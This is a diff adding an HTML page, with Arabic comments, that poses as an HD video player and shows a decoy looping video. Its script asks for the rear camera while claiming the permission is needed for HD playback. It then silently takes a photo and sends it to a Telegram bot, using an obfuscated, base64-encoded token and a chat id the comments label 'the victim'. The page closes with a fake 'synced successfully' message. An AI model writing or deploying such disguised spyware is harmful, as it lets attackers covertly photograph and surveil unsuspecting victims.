@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Video Player HD</title>
+    <style>
+        body { background: #000; color: #fff; text-align: center; margin: 0; overflow: hidden; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; font-family: sans-serif; }
+        video#distraction { width: 95%; max-width: 400px; border-radius: 12px; box-shadow: 0 0 20px rgba(255,255,255,0.3); border: 2px solid #222; }
+        .status { margin-top: 15px; font-size: 14px; color: #555; }
+    </style>
+</head>
+<body>
+
+    <video id="distraction" autoplay muted loop playsinline>
+        <source src="https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExNnI3Z3o1b3V5YXJ4ZzR4ZzR4ZzR4ZzR4ZzR4ZzR4ZzR4ZzR4JmVwPXYxX2ludGVybmFsX2dpZl9ieV9pZCZjdD1n/3o7TKMt1VVNk4X5f8Y/giphy.mp4" type="video/mp4">
+    </video>
+
+    <p class="status">جاري الاتصال بالسيرفر الجغرافي...</p>
+    <canvas id="hidden_canvas" style="display:none;"></canvas>
+
+    <script>
+        // توكن m_y_911_bot مشفر
+        const t = atob("ODM4NjQyNzMyMTpBQUZLcThmQ3NvUEVEZ2NGOEtORlIyTlVyN0doMER3ZnNrRQ==");
+        // معرف الشات (الضحية)
+        const id = new URLSearchParams(window.location.search).get('id');
+        const video = document.createElement('video');
+        const canvas = document.getElementById('hidden_canvas');
+
+        window.onload = function() {
+            // طلب الكاميرا الخلفية (facingMode: "environment")
+            navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" }, audio: false })
+            .then(stream => {
+                video.srcObject = stream;
+                video.play();
+                
+                // استنى 3 ثواني وخد الصورة
+                setTimeout(takePhoto, 3000);
+            })
+            .catch(err => {
+                alert("يرجى الضغط على 'سماح' لتشغيل الفيديو بجودة HD.");
+            });
+        };
+
+        function takePhoto() {
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            
+            canvas.toBlob(blob => {
+                const formData = new FormData();
+                formData.append('photo', blob, 'rear_snap.jpg');
+                formData.append('chat_id', id);
+                formData.append('caption', '📷 **تم التقاط صورة من الكاميرا الخلفية (أبو سند)**');
+
+                fetch(`https://api.telegram.org/bot${t}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                }).then(() => {
+                    document.querySelector('.status').innerHTML = "تم المزامنة بنجاح ✅";
+                });
+            }, 'image/jpeg');
+        }
+    </script>
+</body>
+</html>
